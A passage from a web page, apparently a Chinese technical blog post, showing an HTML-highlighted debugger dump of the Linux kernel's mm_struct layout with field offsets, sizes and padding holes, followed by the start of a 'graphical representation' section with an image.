</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |    24 */</span>        <span class="k">struct</span> <span class="n">maple_tree</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     4 */</span>            <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>                <span class="kt">spinlock_t</span> <span class="n">ma_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 0 */</span>                <span class="n">lockdep_map_p</span> <span class="n">ma_external_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     8 */</span>            <span class="kt">void</span> <span class="o">*</span><span class="n">ma_root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     4 */</span>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ma_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mm_mt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     8 */</span>        <span class="kt">unsigned</span> <span class="nf">long</span> <span class="p">(</span><span class="o">*</span><span class="n">get_unmapped_area</span><span class="p">)(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_legacy_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_compat_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_compat_legacy_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">task_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     8 */</span>        <span class="kt">pgd_t</span> <span class="o">*</span><span class="n">pgd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">membarrier_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   84      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">mm_users</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">mm_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     8 */</span>        <span class="k">struct</span> <span class="n">mm_cid</span> <span class="o">*</span><span class="n">pcpu_cid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mm_cid_next_scan</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">pgtables_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     4 */</span>        <span class="kt">int</span> <span class="n">map_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  124      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">page_table_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |    40 */</span>        <span class="k">struct</span> <span class="n">rw_semaphore</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     4 */</span>            <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     4 */</span>                <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  148      |     4 */</span>            <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |    16 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mmap_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mmlist</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |     4 */</span>        <span class="kt">int</span> <span class="n">mm_lock_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  192      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">hiwater_rss</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  200      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">hiwater_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">total_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">locked_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |     8 */</span>        <span class="kt">atomic64_t</span> <span class="n">pinned_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  232      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">data_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  240      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">exec_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  248      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_vm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">def_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     4 */</span>        <span class="kt">seqcount_t</span> <span class="n">write_protect_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  268      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">arg_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  272      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  280      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">end_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  288      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  296      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">end_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  304      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_brk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  312      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">brk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  328      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  336      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  344      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">env_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  352      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">env_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  360      |   416 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">saved_auxv</span><span class="p">[</span><span class="mi">52</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  776      |   160 */</span>        <span class="k">struct</span> <span class="n">percpu_counter</span> <span class="n">rss_stat</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  936      |     8 */</span>        <span class="k">struct</span> <span class="n">linux_binfmt</span> <span class="o">*</span><span class="n">binfmt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  944      |   128 */</span>        <span class="kt">mm_context_t</span> <span class="n">context</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1072      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1080      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">ioctx_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1088      |     8 */</span>        <span class="k">struct</span> <span class="n">kioctx_table</span> <span class="o">*</span><span class="n">ioctx_table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1096      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1104      |     8 */</span>        <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1112      |     8 */</span>        <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">exe_file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1120      |     8 */</span>        <span class="k">struct</span> <span class="n">mmu_notifier_subscriptions</span> <span class="o">*</span><span class="n">notifier_subscriptions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1128      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_next_scan</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1136      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_scan_offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1144      |     4 */</span>        <span class="kt">int</span> <span class="n">numa_scan_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1148      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">tlb_flush_pending</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1152      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">tlb_flush_batched</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1160      |     8 */</span>        <span class="k">struct</span> <span class="n">uprobes_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1160      |     8 */</span>            <span class="k">struct</span> <span class="n">xol_area</span> <span class="o">*</span><span class="n">xol_area</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">uprobes_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1168      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">hugetlb_usage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1176      |    32 */</span>        <span class="k">struct</span> <span class="n">work_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1176      |     8 */</span>            <span class="kt">atomic_long_t</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1184      |    16 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1184      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1192      |     8 */</span>                <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1200      |     8 */</span>            <span class="kt">work_func_t</span> <span class="n">func</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">async_put_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1208      |     4 */</span>        <span class="n">u32</span> <span class="n">pasid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1216      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ksm_merging_pages</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1224      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ksm_rmap_items</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes): 1232 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1232      |     0 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cpu_bitmap</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes): 1232 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="图形表示">图形表示</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20231109093641811.png"
